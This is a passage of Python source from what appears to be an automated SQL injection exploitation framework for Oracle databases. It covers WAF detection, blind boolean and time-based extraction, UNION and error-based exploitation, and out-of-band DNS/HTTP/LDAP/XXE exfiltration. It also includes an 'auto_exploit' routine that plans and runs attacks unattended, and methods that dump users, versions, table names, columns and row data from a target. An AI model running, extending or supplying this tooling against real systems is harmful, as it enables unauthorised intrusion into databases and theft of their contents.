                    self.logger.error(f"[OracleEnum] Blind extraction failed: {str(e)}")
                    result.blind_extract_result = BlindExtractionResult(
                        success=False, errors=[str(e)], status=ExtractionStatus.FAILED
                    )

            # ============================================================
            # Phase 19: Out-of-Band (OOB) Exploitation
            # ============================================================
            if exploit_oob:
                self.logger.info(
                    "[OracleEnum] OOB exploitation enabled - Starting OOB exploitation..."
                )
                try:
                    oob_result = self.exploit_oob(
                        injection_point=injection_point,
                        query=oob_query or "SELECT USER FROM dual",
                        techniques=oob_techniques,
                        auto_detect=oob_auto_detect,
                    )
                    result.oob_result = oob_result

                    if oob_result.success:
                        self.logger.info(
                            f"[OracleEnum] OOB exploitation complete: {oob_result.get_summary()}"
                        )
                        self.logger.info(
                            f"[OracleEnum] Data extracted: {oob_result.extracted_data}"
                        )
                    else:
                        self.logger.warning(
                            f"[OracleEnum] OOB exploitation failed: {oob_result.errors[0] if oob_result.errors else 'Unknown error'}"
                        )
                except Exception as e:
                    self.logger.error(f"[OracleEnum] OOB exploitation failed: {str(e)}")
                    result.oob_result = OOBExploitResult(
                        success=False, errors=[str(e)], status=OOBStatus.FAILED
                    )

            # ============================================================
            # Phase 20: AI Attack Planning & Auto Exploitation
            # ============================================================
            if create_attack_plan:
                self.logger.info("[OracleEnum] Creating attack plan...")
                try:
                    attack_plan = self.plan_attack(
                        injection_point=injection_point,
                        version_result=result.version_result,
                        schema_result=result.schema_result,
                        privilege_result=result.privilege_results,
                        database_result=result.database_results,
                        sqli_result=result.sqli_result,
                        column_result=result.column_detection,
                        datatype_result=result.datatype_detection,
                        blind_boolean_result=result.blind_boolean_result,
                        time_blind_result=result.time_blind_result,
                        error_based_result=result.error_based_result,
                        waf_result=result.waf_result,
                        blind_extract_result=result.blind_extract_result,
                        oob_result=result.oob_result,
                    )
                    result.attack_plan_result = attack_plan

                    if attack_plan.success:
                        self.logger.info(
                            f"[OracleEnum] Attack plan created: {attack_plan.get_summary()}"
                        )
                    else:
                        self.logger.warning(
                            f"[OracleEnum] Attack plan creation failed: {attack_plan.reasoning}"
                        )
                except Exception as e:
                    self.logger.error(
                        f"[OracleEnum] Attack plan creation failed: {str(e)}"
                    )
                    result.attack_plan_result = AttackPlanResult(
                        success=False,
                        reasoning=[f"Attack plan creation failed: {str(e)}"],
                    )

                # Auto-exploit if requested
                if (
                    auto_exploit
                    and result.attack_plan_result
                    and result.attack_plan_result.success
                ):
                    self.logger.info(
                        "[OracleEnum] Auto-exploitation enabled - Starting automatic exploitation..."
                    )
                    try:
                        auto_results = self.auto_exploit(
                            injection_point=injection_point,
                            query=auto_exploit_query or "SELECT USER FROM dual",
                        )

                        if auto_results.get("success"):
                            self.logger.info(
                                f"[OracleEnum] Auto-exploitation successful! Strategy: {auto_results.get('strategy_used')}"
                            )
                            if auto_results.get("data"):
                                self.logger.info(
                                    f"[OracleEnum] Extracted data: {auto_results['data']}"
                                )
                        else:
                            self.logger.warning(
                                f"[OracleEnum] Auto-exploitation failed: {auto_results.get('error', 'Unknown error')}"
                            )
                    except Exception as e:
                        self.logger.error(
                            f"[OracleEnum] Auto-exploitation failed: {str(e)}"
                        )
        else:
            result.reason = f"Score {result.score} below threshold {result.threshold}"

        # Log final result
        self.logger.info(
            "[OracleEnum] =================================================="
        )
        self.logger.info("[OracleEnum] DETECTION COMPLETE")
        self.logger.info(f"[OracleEnum] Total Score: {result.score}")
        self.logger.info(f"[OracleEnum] Threshold: {result.threshold}")
        self.logger.info(f"[OracleEnum] Indicators: {result.indicators}")
        self.logger.info(f"[OracleEnum] Result: {result.get_summary()}")

        # Phase 20: Log attack plan summary
        if result.attack_plan_result and result.attack_plan_result.success:
            self.logger.info(
                f"[OracleEnum] Attack Plan: {result.attack_plan_result.get_summary()}"
            )

        # Phase 19: Log OOB summary
        if result.oob_result and result.oob_result.success:
            self.logger.info(f"[OracleEnum] OOB: {result.oob_result.get_summary()}")

        # Phase 18: Log blind extraction summary
        if result.blind_extract_result and result.blind_extract_result.success:
            self.logger.info(
                f"[OracleEnum] Blind Extract: {result.blind_extract_result.get_summary()}"
            )

        if result.dump_result and result.dump_result.success:
            self.logger.info(f"[OracleEnum] Dump: {result.dump_result.get_summary()}")
        if result.union_result and result.union_result.success:
            self.logger.info(f"[OracleEnum] UNION: {result.union_result.get_summary()}")
        if result.tamper_result and result.tamper_result.success:
            self.logger.info(
                f"[OracleEnum] Tamper: {result.tamper_result.get_summary()}"
            )
        if result.waf_result and result.waf_result.success:
            self.logger.info(f"[OracleEnum] WAF: {result.waf_result.get_summary()}")
        if result.error_based_result and result.error_based_result.success:
            self.logger.info(
                f"[OracleEnum] Error Based: {result.error_based_result.get_summary()}"
            )
        if result.time_blind_result and result.time_blind_result.success:
            self.logger.info(
                f"[OracleEnum] Time Blind: {result.time_blind_result.get_summary()}"
            )
        if result.blind_boolean_result and result.blind_boolean_result.success:
            self.logger.info(
                f"[OracleEnum] Blind Boolean: {result.blind_boolean_result.get_summary()}"
            )
        if result.datatype_detection and result.datatype_detection.success:
            self.logger.info(
                f"[OracleEnum] Data Types: {result.datatype_detection.get_summary()}"
            )
        if result.column_detection and result.column_detection.success:
            self.logger.info(
                f"[OracleEnum] Columns: {result.column_detection.get_summary()}"
            )
        if result.injection_discovery and result.injection_discovery.success:
            self.logger.info(
                f"[OracleEnum] Injection Points: {result.injection_discovery.get_summary()}"
            )
        if result.sqli_result and result.sqli_result.success:
            self.logger.info(f"[OracleEnum] SQLi: {result.sqli_result.get_summary()}")
        if result.version_result:
            self.logger.info(
                f"[OracleEnum] Version: {result.version_result.get_summary()}"
            )
        if result.database_results and result.database_results.success:
            self.logger.info(
                f"[OracleEnum] Database: {result.database_results.get_summary()}"
            )
        if result.schema_result:
            self.logger.info(
                f"[OracleEnum] Schema: {result.schema_result.get_summary()}"
            )
        if result.privilege_results and result.privilege_results.success:
            self.logger.info(
                f"[OracleEnum] Privileges: {result.privilege_results.get_summary()}"
            )
        if result.extraction_results:
            total_rows = sum(r.row_count for r in result.extraction_results.values())
            self.logger.info(
                f"[OracleEnum] Extraction: {total_rows} rows from {len(result.extraction_results)} tables"
            )
        self.logger.info(
            "[OracleEnum] =================================================="
        )

        self.detection_result = result
        return result

    # ============================================================
    # Phase 20: AI Attack Planning & Orchestration Methods
    # ============================================================

    def _ensure_attack_planner(self) -> AttackPlanner:
        """
        Ensure attack planner is initialized.

        Returns:
            AttackPlanner: Initialized attack planner instance
        """
        if self.attack_planner is None:
            self.logger.info("[OracleEnum] Initializing attack planner...")
            self.attack_planner = AttackPlanner(
                logger=self.logger,
                tamper_engine=self.tamper_engine,
                confidence_threshold=70.0,
                max_estimated_requests=10000,
            )
            self.logger.info("[OracleEnum] Attack planner initialized successfully")
        return self.attack_planner

    def plan_attack(self, *args, **kwargs):
        return plan_attack_impl(self, *args, **kwargs)

    def _execute_strategy(
        self, strategy: ExploitationStrategy, injection_point: str, **kwargs
    ) -> Dict[str, Any]:
        """
        Execute a specific exploitation strategy.

        Args:
            strategy: Strategy to execute
            injection_point: Parameter to inject into
            **kwargs: Additional arguments

        Returns:
            Dict[str, Any]: Execution result
        """
        result = {"success": False, "data": None, "error": None}

        try:
            self.logger.info(f"[OracleEnum] Executing strategy: {strategy.value}")

            if strategy == ExploitationStrategy.UNION:
                # Execute UNION exploitation
                waf_name = None
                if self.detection_result and self.detection_result.waf_result:
                    waf_name = self.detection_result.waf_result.waf_name

                union_result = self.union_exploiter.exploit(
                    injection_point, waf_name=waf_name
                )
                if union_result.success:
                    result["success"] = True
                    result["data"] = union_result.extracted_data
                else:
                    result["error"] = (
                        union_result.errors[0]
                        if union_result.errors
                        else "UNION exploitation failed"
                    )

            elif strategy == ExploitationStrategy.ERROR_BASED:
                # Execute Error-Based exploitation
                error_result = self.error_based_engine.detect_error_based(
                    injection_point
                )
                if error_result.is_vulnerable:
                    result["success"] = True
                    result["data"] = error_result.extracted_values
                else:
                    result["error"] = "Error-Based exploitation not available"

            elif strategy == ExploitationStrategy.BOOLEAN_BLIND:
                # Execute Boolean Blind extraction
                if self.blind_extractor:
                    blind_result = self.blind_extractor.extract_all(
                        injection_point, technique=ExtractionTechnique.BOOLEAN
                    )
                    if blind_result.success:
                        result["success"] = True
                        result["data"] = blind_result.extracted_value
                    else:
                        result["error"] = (
                            blind_result.errors[0]
                            if blind_result.errors
                            else "Boolean Blind extraction failed"
                        )
                else:
                    result["error"] = "Boolean Blind extractor not initialized"

            elif strategy == ExploitationStrategy.TIME_BLIND:
                # Execute Time Blind extraction
                if self.blind_extractor:
                    blind_result = self.blind_extractor.extract_all(
                        injection_point, technique=ExtractionTechnique.TIME
                    )
                    if blind_result.success:
                        result["success"] = True
                        result["data"] = blind_result.extracted_value
                    else:
                        result["error"] = (
                            blind_result.errors[0]
                            if blind_result.errors
                            else "Time Blind extraction failed"
                        )
                else:
                    result["error"] = "Time Blind extractor not initialized"

            elif strategy in [
                ExploitationStrategy.OOB_DNS,
                ExploitationStrategy.OOB_HTTP,
            ]:
                # Execute OOB exploitation
                if self.oob_exploiter:
                    query = kwargs.get("query", "SELECT USER FROM dual")
                    oob_result = self.oob_exploiter.exploit(
                        query=query, auto_detect=True
                    )
                    if oob_result.success:
                        result["success"] = True
                        result["data"] = oob_result.extracted_data
                    else:
                        result["error"] = (
                            oob_result.errors[0]
                            if oob_result.errors
                            else "OOB exploitation failed"
                        )
                else:
                    result["error"] = "OOB exploiter not initialized"

            else:
                result["error"] = f"Strategy {strategy.value} not implemented"

        except Exception as e:
            result["error"] = str(e)
            self.logger.error(f"[OracleEnum] Strategy {strategy.value} failed: {e}")

        return result

    def execute_plan(self, *args, **kwargs):
        return execute_plan_impl(self, *args, **kwargs)

    def auto_exploit(
        self, injection_point: str, query: Optional[str] = None, **kwargs
    ) -> Dict[str, Any]:
        """
        Fully automatic exploitation - plan and execute.

        Args:
            injection_point: Parameter to inject into
            query: Optional SQL query for OOB extraction
            **kwargs: Additional arguments

        Returns:
            Dict[str, Any]: Execution results
        """
        self.logger.info("[OracleEnum] Starting automatic exploitation...")
        self.logger.info(f"[OracleEnum] Injection point: {injection_point}")

        # First, create a plan
        plan = self.plan_attack(injection_point, **kwargs)

        if not plan.success:
            return {
                "success": False,
                "error": "No viable exploitation strategy found",
                "plan": plan.to_dict(),
                "reasoning": plan.reasoning,
            }

        # Execute the plan
        results = self.execute_plan(plan, injection_point, query=query, **kwargs)
        results["plan"] = plan.to_dict()

        if results.get("success"):
            self.logger.info(
                f"[OracleEnum] Auto-exploitation successful! Strategy: {results.get('strategy_used')}"
            )
        else:
            self.logger.warning(
                f"[OracleEnum] Auto-exploitation failed: {results.get('error', 'Unknown error')}"
            )

        return results

    def get_attack_plan_summary(self) -> Optional[str]:
        """
        Get a summary of the current attack plan.

        Returns:
            Optional[str]: Attack plan summary or None
        """
        if self.detection_result and self.detection_result.attack_plan_result:
            return self.detection_result.attack_plan_result.get_summary()
        return None

    def get_available_strategies(self) -> List[str]:
        """
        Get all available exploitation strategies.

        Returns:
            List[str]: List of strategy names
        """
        planner = self._ensure_attack_planner()
        return [s.value for s in planner.get_available_strategies()]

    def validate_attack_plan(self) -> bool:
        """
        Validate the current attack plan.

        Returns:
            bool: True if the plan is valid
        """
        if self.detection_result and self.detection_result.attack_plan_result:
            planner = self._ensure_attack_planner()
            return planner.validate_plan(self.detection_result.attack_plan_result)
        return False

    # ============================================================
    # Phase 18: Blind Extractor Methods
    # ============================================================

    def _ensure_blind_extractor(self, injection_point: str) -> BlindExtractor:
        """
        Ensure blind extractor is initialized with proper configuration.

        Args:
            injection_point: Parameter to inject into

        Returns:
            BlindExtractor: Initialized blind extractor instance
        """
        if self.blind_extractor is None:
            self.logger.info("[OracleEnum] Initializing blind extractor...")
            self.blind_extractor = BlindExtractor(
                session=self.session,
                base_url=self.base_url,
                logger=self.logger,
                injection_point=injection_point,
                use_boolean=(
                    self.detection_result.blind_boolean_result.is_vulnerable
                    if self.detection_result
                    and self.detection_result.blind_boolean_result
                    else True
                ),
                use_time=(
                    self.detection_result.time_blind_result.is_vulnerable
                    if self.detection_result and self.detection_result.time_blind_result
                    else True
                ),
                column_count=(
                    self.detection_result.column_detection.column_count
                    if self.detection_result and self.detection_result.column_detection
                    else 0
                ),
                waf_detected=(
                    self.detection_result.waf_result.waf_detected
                    if self.detection_result and self.detection_result.waf_result
                    else False
                ),
                waf_name=(
                    self.detection_result.waf_result.waf_name
                    if self.detection_result and self.detection_result.waf_result
                    else None
                ),
            )
            self.logger.info("[OracleEnum] Blind extractor initialized successfully")
        return self.blind_extractor

    def extract_blind_all(
        self,
        injection_point: str,
        target_type: str = "all",
        target_name: Optional[str] = None,
        max_items: int = 1000,
        auto_detect_technique: bool = True,
        technique: Optional[ExtractionTechnique] = None,
    ) -> BlindExtractionResult:
        """Perform complete blind extraction."""
        self.logger.info("[OracleEnum] Starting blind extraction...")
        self.logger.info(f"[OracleEnum] Target type: {target_type}")
        self.logger.info(f"[OracleEnum] Target name: {target_name}")
        self.logger.info(f"[OracleEnum] Max items: {max_items}")

        try:
            extractor = self._ensure_blind_extractor(injection_point)

            if auto_detect_technique and technique is None:
                technique = extractor.detect_best_technique(injection_point)
                if technique:
                    self.logger.info(
                        f"[OracleEnum] Auto-detected technique: {technique.value}"
                    )
                else:
                    self.logger.warning(
                        "[OracleEnum] No technique detected, using boolean"
                    )
                    technique = ExtractionTechnique.BOOLEAN

            result = extractor.extract_all(
                injection_point=injection_point,
                technique=technique,
                target_type=target_type,
                target_name=target_name,
                max_items=max_items,
            )

            if self.detection_result:
                self.detection_result.blind_extract_result = result

            return result

        except Exception as e:
            self.logger.error(f"[OracleEnum] Blind extraction failed: {str(e)}")
            return BlindExtractionResult(
                success=False,
                errors=[str(e)],
                status=ExtractionStatus.FAILED,
            )

    def extract_blind_string(
        self,
        injection_point: str,
        query: str,
        max_length: int = 255,
        charset: CharacterSet = CharacterSet.ASCII_PRINTABLE,
        use_binary_search: bool = True,
    ) -> Optional[str]:
        """Extract a string using blind injection."""
        self.logger.info("[OracleEnum] Extracting string via blind injection...")
        extractor = self._ensure_blind_extractor(injection_point)
        extractor.charset = charset
        extractor.use_binary_search = use_binary_search
        return extractor.extract_string(query, max_length)

    def extract_blind_database(self, injection_point: str) -> Optional[str]:
        """Extract database name using blind injection."""
        self.logger.info("[OracleEnum] Extracting database name via blind injection...")
        extractor = self._ensure_blind_extractor(injection_point)
        query = "SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM dual"
        return extractor.extract_string(query, 255)

    def extract_blind_user(self, injection_point: str) -> Optional[str]:
        """Extract current user using blind injection."""
        self.logger.info("[OracleEnum] Extracting current user via blind injection...")
        extractor = self._ensure_blind_extractor(injection_point)
        query = "SELECT USER FROM dual"
        return extractor.extract_string(query, 255)

    def extract_blind_version(self, injection_point: str) -> Optional[str]:
        """Extract database version using blind injection."""
        self.logger.info(
            "[OracleEnum] Extracting database version via blind injection..."
        )
        extractor = self._ensure_blind_extractor(injection_point)
        query = "SELECT banner FROM v$version WHERE ROWNUM = 1"
        return extractor.extract_string(query, 255)

    def extract_blind_tables(
        self,
        injection_point: str,
        max_tables: int = 50,
    ) -> List[str]:
        """Extract table names using blind injection."""
        self.logger.info("[OracleEnum] Extracting table names via blind injection...")
        extractor = self._ensure_blind_extractor(injection_point)

        tables = []
        for i in range(1, max_tables + 1):
            table_query = f"SELECT table_name FROM (SELECT table_name, ROWNUM rn FROM all_tables) WHERE rn = {i}"
            table_name = extractor.extract_string(table_query, 255)
            if table_name:
                tables.append(table_name)
            else:
                break

        return tables

    def extract_blind_columns(
        self,
        injection_point: str,
        table_name: str,
        max_columns: int = 30,
    ) -> List[str]:
        """Extract column names from a table using blind injection."""
        self.logger.info(
            f"[OracleEnum] Extracting columns from {table_name} via blind injection..."
        )
        extractor = self._ensure_blind_extractor(injection_point)

        columns = []
        for i in range(1, max_columns + 1):
            col_query = f"SELECT column_name FROM (SELECT column_name, ROWNUM rn FROM all_tab_columns WHERE table_name = '{table_name}') WHERE rn = {i}"
            col_name = extractor.extract_string(col_query, 255)
            if col_name:
                columns.append(col_name)
            else:
                break

        return columns

    def extract_blind_table_data(
        self,
        injection_point: str,
        table_name: str,
        columns: List[str],
        max_rows: int = 100,
    ) -> List[Dict[str, Any]]:
        """Extract data from a table using blind injection."""
        self.logger.info(
            f"[OracleEnum] Extracting data from {table_name} via blind injection..."
        )
        extractor = self._ensure_blind_extractor(injection_point)

        data = []
        for row_idx in range(max_rows):
            row_data = {}
            for col in columns:
                query = f"SELECT {col} FROM (SELECT {col}, ROWNUM rn FROM {table_name}) WHERE rn = {row_idx + 1}"
                value = extractor.extract_string(query, 1000)
                if value is not None:
                    row_data[col] = value
                else:
                    row_data[col] = None

            if row_data:
                data.append(row_data)
            else:
                break

        return data

    def get_blind_extract_progress(self) -> Dict[str, Any]:
        """Get current blind extraction progress."""
        if self.blind_extractor:
            return self.blind_extractor.track_progress(
                total_items=100,
                current_item=(
                    self.blind_extractor.extraction_result.characters_extracted
                    if self.blind_extractor.extraction_result
                    else 0
                ),
            )
        return {"status": "Not initialized"}

    def save_blind_checkpoint(self) -> Optional[str]:
        """Save a checkpoint for blind extraction."""
        if self.blind_extractor and self.blind_extractor.extraction_result:
            return self.blind_extractor.save_checkpoint()
        return None

    def load_blind_checkpoint(self, checkpoint_path: str) -> bool:
        """Load a checkpoint for blind extraction."""
        if self.blind_extractor:
            return self.blind_extractor.load_checkpoint(checkpoint_path)
        return False

    def resume_blind_extraction(self, checkpoint_path: str) -> BlindExtractionResult:
        """Resume blind extraction from a checkpoint."""
        self.logger.info(
            f"[OracleEnum] Resuming blind extraction from {checkpoint_path}"
        )

        if self.blind_extractor:
            return self.blind_extractor.resume_extraction(checkpoint_path)

        extractor = self._ensure_blind_extractor(self._current_injection_point or "id")
        return extractor.resume_extraction(checkpoint_path)

    def stop_blind_extraction(self) -> None:
        """Stop ongoing blind extraction."""
        if self.blind_extractor:
            self.blind_extractor.stop()
            self.logger.info("[OracleEnum] Blind extraction stopped")

    def is_blind_extracting(self) -> bool:
        """Check if blind extraction is in progress."""
        return self.blind_extractor.is_extracting() if self.blind_extractor else False

    def get_blind_statistics(self) -> Dict[str, Any]:
        """Get blind extraction statistics."""
        if self.blind_extractor:
            return self.blind_extractor.get_statistics()
        return {"status": "Not initialized"}

    # ============================================================
    # Phase 19: Out-of-Band (OOB) Exploitation Methods
    # ============================================================

    def _ensure_oob_exploiter(self, injection_point: str) -> OutOfBandExploiter:
        """
        Ensure OOB exploiter is initialized.

        Args:
            injection_point: Parameter to inject into

        Returns:
            OutOfBandExploiter: Initialized OOB exploiter instance
        """
        if self.oob_exploiter is None:
            self.logger.info("[OracleEnum] Initializing OOB exploiter...")
            self.oob_exploiter = OutOfBandExploiter(
                session=self.session,
                base_url=self.base_url,
                injection_point=injection_point,
                logger=self.logger,
                enable_dns=True,
                enable_http=True,
                enable_ldap=True,
                enable_xxe=True,
            )
            self.logger.info("[OracleEnum] OOB exploiter initialized successfully")
        return self.oob_exploiter

    def exploit_oob(
        self,
        injection_point: str,
        query: str,
        techniques: Optional[List[OOBTechnique]] = None,
        auto_detect: bool = True,
    ) -> OOBExploitResult:
        """
        Perform Out-of-Band exploitation.

        Args:
            injection_point: Parameter to inject into
            query: SQL query to execute
            techniques: Specific techniques to use
            auto_detect: Auto-detect available techniques

        Returns:
            OOBExploitResult: Exploitation result
        """
        self.logger.info("[OracleEnum] Starting OOB exploitation...")
        self.logger.info(f"[OracleEnum] Query: {query[:100]}...")

        try:
            exploiter = self._ensure_oob_exploiter(injection_point)
            result = exploiter.exploit(
                query=query,
                techniques=techniques,
                auto_detect=auto_detect,
            )

            if self.detection_result:
                self.detection_result.oob_result = result

            return result

        except Exception as e:
            self.logger.error(f"[OracleEnum] OOB exploitation failed: {str(e)}")
            return OOBExploitResult(
                success=False, errors=[str(e)], status=OOBStatus.FAILED
            )

    def extract_database_oob(self, injection_point: str) -> Tuple[Optional[str], float]:
        """Extract database name using OOB techniques."""
        self.logger.info("[OracleEnum] Extracting database name via OOB...")
        exploiter = self._ensure_oob_exploiter(injection_point)
        return exploiter.extract_database_name_oob()

    def extract_user_oob(self, injection_point: str) -> Tuple[Optional[str], float]:
        """Extract current user using OOB techniques."""
        self.logger.info("[OracleEnum] Extracting current user via OOB...")
        exploiter = self._ensure_oob_exploiter(injection_point)
        return exploiter.extract_current_user_oob()

    def extract_version_oob(self, injection_point: str) -> Tuple[Optional[str], float]:
        """Extract database version using OOB techniques."""
        self.logger.info("[OracleEnum] Extracting database version via OOB...")
        exploiter = self._ensure_oob_exploiter(injection_point)
        return exploiter.extract_version_oob()

    def extract_table_oob(
        self,
        injection_point: str,
        table_name: str,
        columns: List[str],
        max_rows: int = 10,
    ) -> List[Dict[str, Any]]:
        """Extract table data using OOB techniques."""
        self.logger.info(f"[OracleEnum] Extracting {table_name} data via OOB...")
        exploiter = self._ensure_oob_exploiter(injection_point)
        return exploiter.extract_table_data_oob(table_name, columns, max_rows)

    def detect_oob_capabilities(self, injection_point: str) -> Dict[str, bool]:
        """Detect available OOB capabilities."""
        self.logger.info("[OracleEnum] Detecting OOB capabilities...")
        exploiter = self._ensure_oob_exploiter(injection_point)
        return exploiter.detect_capabilities()

    def get_oob_statistics(self) -> Dict[str, Any]:
        """Get OOB exploitation statistics."""
        if self.oob_exploiter:
            return self.oob_exploiter.get_statistics()
        return {"status": "Not initialized"}

    def clear_oob_callbacks(self) -> None:
        """Clear received OOB callbacks."""
        if self.oob_exploiter:
            self.oob_exploiter.clear_callbacks()
            self.logger.info("[OracleEnum] OOB callbacks cleared")

    def stop_oob_exploitation(self) -> None:
        """Stop ongoing OOB exploitation."""
        if self.oob_exploiter:
            self.oob_exploiter.stop()
            self.logger.info("[OracleEnum] OOB exploitation stopped")

    # ============================================================
    # Original Methods (unchanged)
    # ============================================================

    def is_oracle(
        self,
        injection_point: str,
        detect_waf: bool = False,
        detect_sqli: bool = False,
        discover_parameters: bool = False,
        detect_columns: bool = False,
        detect_datatypes: bool = False,
        detect_blind_boolean: bool = False,
        detect_time_blind: bool = False,
        detect_error_based: bool = False,
        exploit_union: bool = False,
        fingerprint_version: bool = False,
        enumerate_database: bool = False,
        enumerate_schema: bool = False,
        enumerate_privileges: bool = False,
        extract_data: bool = False,
    ) -> bool:
        """Simple boolean check if the backend is Oracle."""
        result = self.detect(
            injection_point,
            detect_waf,
            detect_sqli,
            discover_parameters,
            detect_columns,
            detect_datatypes,
            detect_blind_boolean,
            detect_time_blind,
            detect_error_based,
            exploit_union,
            fingerprint_version,
            enumerate_database,
            enumerate_schema,
            enumerate_privileges,
            extract_data,
        )
        return result.is_oracle

    def get_detection_score(self, injection_point: str) -> int:
        """Get the detection score without performing full detection."""
        if self.detection_result is None:
            self.detect(injection_point)
        return self.detection_result.score if self.detection_result else 0

    # ============================================================
    # Phase 2: Version Methods
    # ============================================================

    def get_oracle_version(self, injection_point: str) -> Optional[str]:
        """Get Oracle version."""
        if not self.is_oracle(injection_point):
            self.logger.warning("[OracleEnum] Cannot get version - Oracle not detected")
            return None
        return self.version_fingerprinter.get_version(injection_point)

    def get_oracle_edition(self, injection_point: str) -> Optional[str]:
        """Get Oracle edition."""
        if not self.is_oracle(injection_point):
            self.logger.warning("[OracleEnum] Cannot get edition - Oracle not detected")
            return None
        return self.version_fingerprinter.get_edition(injection_point)

    def is_oracle_xe(self, injection_point: str) -> bool:
        """Check if Oracle is Express Edition."""
        if not self.is_oracle(injection_point):
            self.logger.warning("[OracleEnum] Cannot check XE - Oracle not detected")
            return False
        return self.version_fingerprinter.is_xe(injection_point)

    # ============================================================
    # Phase 3: Schema Methods
    # ============================================================

    def get_schema_information(self, injection_point: str) -> OracleSchemaResult:
        """Get complete schema information."""
        if not self.is_oracle(injection_point):
            self.logger.warning("[OracleEnum] Cannot get schema - Oracle not detected")
            result = OracleSchemaResult()
            result.add_error("Oracle not detected")
            return result
        return self.schema_enumerator.enumerate_all(injection_point)

    def get_database_information(self, injection_point: str) -> Dict[str, Any]:
        """Get basic database information only."""
        if not self.is_oracle(injection_point):
            self.logger.warning(
                "[OracleEnum] Cannot get database info - Oracle not detected"
            )
            return {"error": "Oracle not detected"}
        return self.schema_enumerator.get_database_info(injection_point)

    def get_current_user(self, injection_point: str) -> Optional[str]:
        """Get current database user."""
        if not self.is_oracle(injection_point):
            self.logger.warning("[OracleEnum] Cannot get user - Oracle not detected")
            return None
        return self.schema_enumerator.get_current_user(injection_point)

    # ============================================================
    # Phase 4: Data Extraction Methods
    # ============================================================

    def extract_table_data(
        self,
        injection_point: str,
        schema: str,
        table: str,
        columns: Optional[List[str]] = None,
        max_rows: Optional[int] = None,
    ) -> OracleExtractionResult:
        """Extract data from a specific table."""
        if not self.is_oracle(injection_point):
            self.logger.warning(
                "[OracleEnum] Cannot extract data - Oracle not detected"
            )
            result = OracleExtractionResult()
            result.add_error("Oracle not detected")
            return result
        return self.data_extractor.extract_table(
            injection_point, schema, table, columns, max_rows
        )

    def extract_rows(
        self,
        injection_point: str,
        schema: str,
        table: str,
        columns: Optional[List[str]] = None,
        limit: Optional[int] = None,
        offset: Optional[int] = 0,
    ) -> OracleExtractionResult:
        """Extract rows with pagination."""
        if not self.is_oracle(injection_point):
            self.logger.warning(
                "[OracleEnum] Cannot extract rows - Oracle not detected"
            )
            result = OracleExtractionResult()
            result.add_error("Oracle not detected")
            return result
        return self.data_extractor.extract_rows(
            injection_point, schema, table, columns, limit, offset
        )

    def get_table_row_count(self, injection_point: str, schema: str, table: str) -> int:
        """Get row count for a table."""
        if not self.is_oracle(injection_point):
            self.logger.warning(
                "[OracleEnum] Cannot get row count - Oracle not detected"
            )
            return -1
        return self.data_extractor.count_rows(injection_point, schema, table)

    # ============================================================
    # Phase 5: Privilege Methods
    # ============================================================

    def get_privilege_information(self, injection_point: str) -> OraclePrivilegeResult:
        """Get complete privilege information."""
        if not self.is_oracle(injection_point):
            self.logger.warning(
                "[OracleEnum] Cannot get privileges - Oracle not detected"
            )
            result = OraclePrivilegeResult()
            result.add_error("Oracle not detected")
            return result
        return self.privilege_enumerator.enumerate_all(injection_point)

    def get_current_privileged_user(self, injection_point: str) -> Optional[str]:
        """Get current database user (privilege context)."""
        if not self.is_oracle(injection_point):
            self.logger.warning("[OracleEnum] Cannot get user - Oracle not detected")
            return None
        return self.privilege_enumerator.get_current_user(injection_point)

    def check_dba_status(self, injection_point: str) -> bool:
        """Check if current user has DBA privileges."""
        if not self.is_oracle(injection_point):
            self.logger.warning("[OracleEnum] Cannot check DBA - Oracle not detected")
            return False
        return self.privilege_enumerator.is_dba(injection_point)

    # ============================================================
    # Phase 6: Database Methods
    # ============================================================

    def get_database_environment(self, injection_point: str) -> OracleDatabaseResult:
        """Get complete database environment information."""
        if not self.is_oracle(injection_point):
            self.logger.warning(
                "[OracleEnum] Cannot get database environment - Oracle not detected"
            )
            result = OracleDatabaseResult()
            result.add_error("Oracle not detected")
            return result
        return self.database_enumerator.enumerate_all(injection_point)

    def get_database_version_info(self, injection_point: str) -> Optional[str]:
        """Get database version only."""
        if not self.is_oracle(injection_point):
            self.logger.warning(
                "[OracleEnum] Cannot get database version - Oracle not detected"
            )
            return None
        return self.database_enumerator.get_version(injection_point)

    def get_instance_name_info(self, injection_point: str) -> Optional[str]:
        """Get instance name only."""
        if not self.is_oracle(injection_point):
            self.logger.warning(
                "[OracleEnum] Cannot get instance name - Oracle not detected"
            )
            return None
        return self.database_enumerator.get_instance(injection_point)

    # ============================================================
    # Phase 7: SQL Injection Methods
    # ============================================================

    def detect_sqli(
        self, injection_point: str, fast_mode: bool = False
    ) -> SQLiDetectionResult:
        """Detect SQL injection vulnerability."""
        self.logger.info("[OracleEnum] Running SQL injection detection...")
        return self.sqli_detector.detect(injection_point, fast_mode)

    def is_sqli_vulnerable(self, injection_point: str) -> bool:
        """Quick check if parameter is vulnerable to SQL injection."""
        self.logger.info("[OracleEnum] Checking SQL injection vulnerability...")
        return self.sqli_detector.is_vulnerable(injection_point)

    def get_sqli_payload(self, injection_point: str) -> Optional[str]:
        """Get working SQL injection payload."""
        self.logger.info("[OracleEnum] Getting SQL injection payload...")
        return self.sqli_detector.get_payload(injection_point)

    def get_sqli_confidence(self, injection_point: str) -> int:
        """Get SQL injection confidence score."""
        self.logger.info("[OracleEnum] Getting SQL injection confidence...")
        return self.sqli_detector.get_confidence(injection_point)

    # ============================================================
    # Phase 8: Injection Point Methods
    # ============================================================

    def discover_injection_points(
        self,
        url: str,
        data: Optional[Union[str, Dict]] = None,
        json_data: Optional[Union[str, Dict]] = None,
        xml_data: Optional[str] = None,
        cookies: Optional[Dict[str, str]] = None,
        headers: Optional[Dict[str, str]] = None,
        test_parameters: bool = True,
    ) -> InjectionDiscoveryResult:
        """Discover all injection points in a request."""
        self.logger.info("[OracleEnum] Discovering injection points...")
        return self.injection_discovery.discover_all(
            url, data, json_data, xml_data, cookies, headers, test_parameters
        )

    def get_injection_points(self) -> List[Dict[str, Any]]:
        """Get all discovered injection points as dictionaries."""
        if self.detection_result and self.detection_result.injection_discovery:
            return [
                p.to_dict()
                for p in self.detection_result.injection_discovery.parameters
            ]
        return []

    def get_best_injection_point(self) -> Optional[Dict[str, Any]]:
        """Get the best injection point."""
        if self.detection_result and self.detection_result.injection_discovery:
            best = self.detection_result.injection_discovery.get_best_parameter()
            return best.to_dict() if best else None
        return None

    def get_injectable_parameters(self) -> List[Dict[str, Any]]:
        """Get all injectable parameters."""
        if self.detection_result and self.detection_result.injection_discovery:
            injectable = (
                self.detection_result.injection_discovery.get_injectable_parameters()
            )
            return [p.to_dict() for p in injectable]
        return []

    # ============================================================
